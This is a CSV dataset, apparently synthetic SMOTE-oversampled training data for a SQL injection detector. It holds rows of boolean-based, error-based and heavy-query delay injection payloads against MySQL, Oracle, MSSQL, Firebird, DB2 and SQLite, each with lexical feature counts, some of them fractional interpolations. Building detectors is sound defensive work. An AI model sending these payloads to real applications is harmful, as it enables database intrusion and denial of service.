id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000058,attack,boolean,""" or isNULL  (  1/0  )   /*",nearest_attack_euclidean,R000014,7.143400600072952,71.04009123595131,23.088996349460448,3.4661694704973454,24.177992698920896,7.842052919054767,28.076770071083168,10.943275546892496,0.3213289105135566,0.0947126655829855,0.40048349283667584,0.18347493106678206,1.3481660582434078,0.5506113139188641,0.8987773721622718,1.5506113139188642,0.5506113139188641,0.449388686081136,0.0,5.145720802567951,0.0,-1.1102230246251565e-16,0.449388686081136,3.449388686081136,0.44938868608113586,0.5506113139188641,0.4493886860811359,0.0,0.5506113139188641,0.4493886860811359,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000059,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ""%""  =  """,nearest_attack_euclidean,R000090,0.7609744201847266,125.15371869116287,30.38140494546512,4.217108069589721,75.05123956372096,3.9999999999999982,30.339669236511675,15.762809890930239,0.6019012342135409,0.03222814810562491,0.23956642020666763,0.12630419747416655,0.0,3.0,0.0,0.0,1.0,1.0,0.0,3.144214836395358,0.6185950545348804,-1.1102230246251565e-16,3.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000060,attack,boolean,"-5830  )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  ",nearest_attack_euclidean,R000287,0.7084678657315727,363.68110353138854,31.0,3.310991963712828,91.86603542146395,52.309427790570496,169.35092642406886,50.15471389528524,0.2529507523964583,0.14368542771483953,0.46539447339347695,0.13796934649522521,0.0,0.0,1.0,0.0,0.0,2.2886784738213115,0.0,35.866035421463934,0.0,-1.1102230246251565e-16,1.0,13.28867847382131,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,2.0,0.0,0.0,0.0,0.2886784738213117,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.9999999999999999,18.28867847382131
SMOTE_000061,attack,boolean,1'||  (  select 'xdzp' from dual where 5786  =  5786 and   (  3020  =  3020  )  *6703  )  ||',nearest_attack_euclidean,R000108,0.42111159753582544,90.13945861314261,32.408163850995024,4.092407991318808,25.210885134660032,20.605442567330016,30.013606418325043,14.309524492827528,0.27973561720122225,0.22973412766896784,0.3328195866762109,0.15771066845359893,3.802721283665008,0.0,0.0,0.0,0.901360641832504,2.0,0.0,3.802721283665008,0.0,-1.1102230246251565e-16,0.0,6.704081925497512,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.9013606418325039,1.0,0.0,1.0,0.901360641832504,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.901360641832504
SMOTE_000062,attack,boolean,"1%'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000043,0.032992994123321434,135.98019067596462,30.98019067596463,3.9406465345565995,65.0,8.0,45.0,17.98019067596463,0.4780113075197331,0.05883216092550561,0.330930905205969,0.13222562634879229,1.0,0.0,2.0,0.0,1.0,1.0,0.0,7.0,0.9801906759646288,-1.1102230246251565e-16,2.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000063,attack,boolean,"-2726""   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   ""ococ""  =  ""ococ",nearest_attack_euclidean,R000087,0.040129104557877104,85.98900562446309,22.05497187768459,3.2001688077965786,15.956022497852324,16.0,40.0,14.032983126610752,0.1855531935463599,0.1860705759245678,0.46517643981141954,0.16319979071765275,0.0,3.9999999999999996,1.0,0.0,0.0,2.0,0.0,6.0,0.021988751073835355,0.010994375536917733,1.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0000000000000004
SMOTE_000064,attack,boolean,"1%' or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000099,0.030535924804009573,121.0,28.0,4.015868317430159,62.0,10.0,30.0,19.0,0.512396694214876,0.08264462809917356,0.24793388429752067,0.15702479338842976,0.9901022528006915,0.009897747199308693,2.0,0.0,1.0,1.0,0.0,4.0,1.0,5.0,4.0,4.0,0.9901022528006915,0.009897747199308526,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000065,attack,boolean,"1'   )    )     )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  'tzbp'  =  'tzbp",nearest_attack_euclidean,R000196,1.7314933734475746,298.8388413450226,34.735536538009036,3.7351095818398083,64.41321922805422,73.94214615203614,122.48347596493224,38.0,0.21540343423228697,0.24734385434542033,0.4100856319198829,0.12716707950240977,4.0,0.0,0.0,0.0,2.0,2.0,0.0,22.528926923981928,0.0,-1.1102230246251565e-16,6.0,5.471073076018073,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.3677682690045183,4.367768269004518,0.0,0.3677682690045183,1.3677682690045185,1.6322317309954817,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.735536538009036
SMOTE_000066,attack,boolean,"1""  )   where 3393  =  3393 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000173,0.2181827953340918,141.90480656340273,32.09519343659727,4.155328810190357,69.0,16.0,41.0,15.904806563402733,0.48624354945186354,0.11275212740912777,0.2889273264858899,0.11207699665311878,0.0,0.9048065634027322,2.0,0.0,1.0,2.0,0.0,5.0,0.0,-1.1102230246251565e-16,2.0,5.0,0.0,0.9048065634027324,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000067,attack,boolean,"1"" and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and ""hcjz"" like ""hcjz",nearest_attack_euclidean,R000202,1.2904473461843433,173.21265923433074,32.6992632378705,3.9310704030736305,107.09042209231642,11.024447428402869,39.748158094676235,15.349631618935247,0.6120297501179761,0.06439164013327686,0.2326420865939761,0.09093652315477088,0.0,3.0244474284028695,0.0,0.0,1.0,1.0,0.0,4.0,0.0,-1.1102230246251565e-16,5.024447428402869,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.6748158094676233,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.6748158094676233
SMOTE_000068,attack,boolean,"-6599%""   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000091,1.1248579483981695,97.49996588158987,27.490194740454506,3.4747418719268266,18.862726366363066,16.0,42.94116844272703,19.696071072499777,0.1786619507406386,0.1709343032780763,0.4489619967446542,0.20144174923663088,0.0,3.9999999999999996,0.7549026297727476,0.0,0.0,2.0,0.0,6.980389480909009,2.0,1.2450973702272523,1.0,4.225486851136262,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.24509737022725234,0.0,0.0,0.0,0.0,1.2450973702272523,0.7549026297727475,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0000000000000004
SMOTE_000069,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  ""dskh""  =  ""dskh",nearest_attack_euclidean,R000305,0.7778986905204438,151.09931898361918,31.0,4.033900235184886,81.75252405004514,5.168349366696754,46.010096200180534,18.168349366696756,0.5456423695151198,0.033353596926286894,0.3005834682048205,0.12042056535377287,0.0,3.292087341674189,0.0,0.0,1.0,1.0,0.0,6.460436708370944,0.0,-1.1102230246251565e-16,2.707912658325811,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.2920873416741888,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.292087341674189
SMOTE_000070,attack,boolean,-2504'   )    )     )   or 8723  =  9715,nearest_attack_euclidean,R000193,1.7814662298854238,61.914335366289805,17.341694002017743,2.846322161651232,3.3416940020177393,17.36677600807097,32.522477352165595,8.683388004035486,0.052763789142733164,0.28643230784476437,0.5175877490901202,0.14321615392238218,0.5527686659940859,0.0,1.0,0.0,0.4472313340059142,1.4472313340059142,0.0,5.236156670029571,0.0,-1.1102230246251565e-16,0.0,2.8944626680118284,0.5527686659940858,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.4472313340059142,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.4472313340059144
SMOTE_000071,attack,boolean,"1'  )   as fxuk where 6184  =  6184 and make_set  (  9292  =  2785,2785  )  --",nearest_attack_euclidean,R000131,1.0520895885127939,78.0,29.660009666988696,4.004824197551743,21.0,21.0,25.999999999999996,10.0,0.2692307692307692,0.2692307692307692,0.3333333333333333,0.1282051282051282,0.6600096669886955,0.3399903330113046,2.0,0.0,0.0,2.0,0.0,3.0,0.0,1.0,1.0,4.0,0.6600096669886955,0.3399903330113046,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0000000000000004
SMOTE_000072,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   ""uidb"" like ""uidb",nearest_attack_euclidean,R000270,1.0362515053230021,139.04922036576653,29.855252797086514,4.2112472376154875,81.43424160874046,6.565758391259539,34.26964877523535,16.779571590531166,0.5994046272376292,0.04381544886405102,0.2386564368450346,0.11812348705328529,0.0,3.0,0.0,0.0,0.7861868007283717,0.0,0.0,5.351945191987911,0.0,0.4276263985432564,3.2138131992716286,1.6414395978148848,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,3.469446951953614e-18,0.21381319927162823,0.7861868007283718,0.0,0.0,0.7861868007283718,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6414395978148848,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.213813199271628
SMOTE_000073,attack,boolean,"1   )    )    as aeat where 1007  =  1007 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000058,1.0056293043506843,160.0,30.697466254955287,3.9765854275694466,73.69746625495529,18.0,48.0,20.302533745044713,0.4606091640934705,0.1125,0.3,0.12689083590652947,0.0,0.30253374504471425,2.0,0.0,1.0,2.0,0.0,6.0,0.0,5.0,4.0,5.0,0.0,0.3025337450447142,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,0.6974662549552858,0.30253374504471425,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000074,attack,boolean,"1""  )   as paai where 4089  =  4089 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000026,0.18916765226908552,158.0,36.283530865568856,4.181857568149723,81.015283941018,16.0,44.701185193413146,16.283530865568856,0.5127549616520126,0.10126582278481013,0.28291889362919714,0.10306032193398011,0.0,1.0,2.0,0.0,1.0,2.0,0.0,5.283530865568858,0.0,-1.1102230246251565e-16,2.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000075,attack,boolean,"-3501'   )    )     )   or make_set  (  7122  =  6158,6158  )   and    (    (     (  'mlfl' like 'mlfl",nearest_attack_euclidean,R000063,0.12107780680237985,102.0,29.745560275516706,3.5259676557579844,24.0,16.0,46.0,16.0,0.23529411764705882,0.1568627450980392,0.45098039215686275,0.1568627450980392,4.0,0.0,1.0,0.0,0.0,1.0,0.0,8.0,0.0,1.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0000000000000004
SMOTE_000076,attack,boolean,select * from users where id  =  1.<@$ or 1  =  1 -- 1,nearest_attack_euclidean,R000018,0.9219180766632642,55.78964694850647,22.552588262873382,3.7018710310258776,24.894823474253233,4.447411737126616,17.894823474253236,8.552588262873384,0.4461586656594889,0.07950244125504836,0.32052888553162984,0.15381000755383284,0.0,0.0,2.0,0.0,1.0,2.0,0.0,0.0,0.0,-1.1102230246251565e-16,0.0,6.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,1.1102230246251565e-16,1.4474117371266175,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.447411737126617
SMOTE_000077,attack,boolean,or 'text'   =   n'text',nearest_attack_euclidean,R000012,1.028617358627263,23.526468431891473,9.789702647837181,2.829988075894492,9.94706313621709,0.5264684318914554,7.789702647837181,5.263234215945726,0.42607182501249935,0.021058737275658157,0.32952675109046087,0.22334268662138163,4.0,0.0,0.0,0.0,0.0,1.0,0.0,0.2632342159457277,0.0,-1.1102230246251565e-16,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.26323421594572705,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000078,attack,boolean,"1%'   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000071,0.10398706725669994,137.5627674807316,31.0,3.917707023829698,63.0,10.0,42.81639674883778,21.746370731893812,0.45857681617607676,0.07278997082159948,0.3105742056219048,0.15805900738041895,1.0,0.0,2.0,0.0,1.0,1.0,0.0,6.74637073189381,1.0,5.0,4.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000079,attack,boolean,"1%""   )    )     )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000167,1.0045663153604152,117.69906528227894,34.60900593475263,3.6247154006962994,31.390994065247373,15.0,52.090059347526314,19.21801186950526,0.267466419451302,0.12771481470726745,0.44157728434430576,0.16324148149712472,2.0,1.0,2.0,1.0,0.0,1.0,0.0,10.218011869505261,1.0,-1.1102230246251565e-16,1.0,4.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.39099406524736896,0.6090059347526311,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000080,attack,boolean,"1'||  (  select 'lxpg' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",nearest_attack_euclidean,R000223,1.1728648823533396,172.3585793142859,34.50729808253961,4.170264179905122,80.61222835555569,18.0,47.7463509587302,26.0,0.46750539876253616,0.10449922120679656,0.2770520605097389,0.15094331952092838,4.0,0.0,0.0,0.0,1.0,2.0,0.0,6.0,0.0,5.0,4.0,7.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.9999999999999999,2.0,0.0,1.0,1.3731754793650972,0.6268245206349027,0.3731754793650973,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.373175479365098
SMOTE_000081,attack,boolean,"1 where 7522  =  7522 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",nearest_attack_euclidean,R000231,1.4151872821074991,257.9685057274021,32.89517720265421,3.793181375178584,60.918304624822156,72.81545495659837,95.49261971413102,28.742126431850515,0.24230638972585578,0.27864449024883914,0.36816178993856663,0.11088733008673843,0.0,0.10482279734579025,2.0,0.0,1.8951772026542095,2.0,0.0,16.742126431850515,0.0,-1.1102230246251565e-16,6.0,5.89517720265421,0.0,0.10482279734579028,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.8951772026542097,0.0,3.6855316079626292,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8951772026542097,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.580708810616839
SMOTE_000082,attack,boolean,"1""   )    )    as wnzf where 3352  =  3352 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000142,0.10288121457121267,274.85411903369356,38.93969047545755,3.799993212838587,81.66829761501656,36.63814285274533,111.5778333282029,44.96984523772878,0.2971381741106701,0.1331830018132848,0.40597705314228355,0.16370177093376162,0.0,1.0,2.0,0.0,0.0,1.9698452377287778,0.0,23.969845237728777,0.030154762271222102,2.0,4.0,13.969845237728777,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.9999999999999999,0.0,0.0,0.969845237728778,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.969845237728778
SMOTE_000083,attack,boolean,"1'   )    )     )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  'tzbp'  =  'tzbp",nearest_attack_euclidean,R000196,1.7434982858626904,298.8515905299925,34.74063621199701,3.735831238849902,64.44381727198206,73.96254484798803,122.44522841002242,38.0,0.21549622380514996,0.24740130769307844,0.4099407903531743,0.12716167814859727,4.0,0.0,0.0,0.0,2.0,2.0,0.0,22.51872757600598,0.0,-1.1102230246251565e-16,6.0,5.481272423994021,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.3703181059985051,4.370318105998505,0.0,0.3703181059985052,1.3703181059985052,1.6296818940014948,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.74063621199701
SMOTE_000084,attack,boolean,1'   )    )     )   and 7533  =  7533 and    (    (     (  'hoyw'  =  'hoyw,nearest_attack_euclidean,R000247,0.4327183943408425,79.53346966616354,17.971073767897188,2.8824148949666917,15.379751637528031,9.788429507158876,41.57685901431775,12.788429507158874,0.19211058469228745,0.12249401170631889,0.5247517876771823,0.16064361592421134,4.0,0.0,0.0,0.0,0.0,2.0,0.0,6.394214753579437,0.0,0.19710737678971857,0.1971073767897189,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0000000000000004
SMOTE_000085,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  'ldqq'  =  'ldqq",nearest_attack_euclidean,R000127,1.0537390749389572,109.90151945566363,28.695527515364503,3.6986254467816,41.271645636523374,10.119409394205627,43.23881878841125,15.271645636523376,0.37756658262151566,0.0908008596956224,0.39270909258713316,0.13892346509572878,3.4238818788411254,0.0,0.0,0.0,1.0,1.4238818788411254,0.0,7.423881878841125,0.0,1.0,1.0,2.4238818788411254,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.4238818788411254,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.423881878841126
